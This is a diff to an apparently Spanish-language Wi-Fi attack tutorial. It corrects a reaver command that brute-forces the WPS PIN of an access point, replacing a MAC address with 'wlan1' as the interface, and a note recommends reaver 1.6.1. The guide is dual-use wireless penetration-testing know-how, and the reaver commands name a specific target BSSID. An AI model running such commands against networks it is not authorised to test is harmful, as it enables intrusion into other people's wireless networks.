@@ -32,7 +32,7 @@ wash --interface mon0
 
 ```bash
 reaver --bssid <MAC Address de objetivo> --channel <canal del AP> --interface <interfaz en modo monitor> -vvv --no-associate
-reaver --bssid F8:23:B2:B9:50:A8 --channel 1 --interface 48:5D:60:2A:45:25 -vvv --no-associate
+reaver --bssid F8:23:B2:B9:50:A8 --channel 1 --interface wlan1 -vvv --no-associate
 ```
 
 *Nota: Tener en consideración que kali cuenta con versiones más recientes lo que puede causar un error similar a `send_packet called from resend_last_packet() send.c:161` si es el caso se recomienda usar la versión 1.6.1, incluida en [el repositorio](./../files/reaver_1_6_1).*
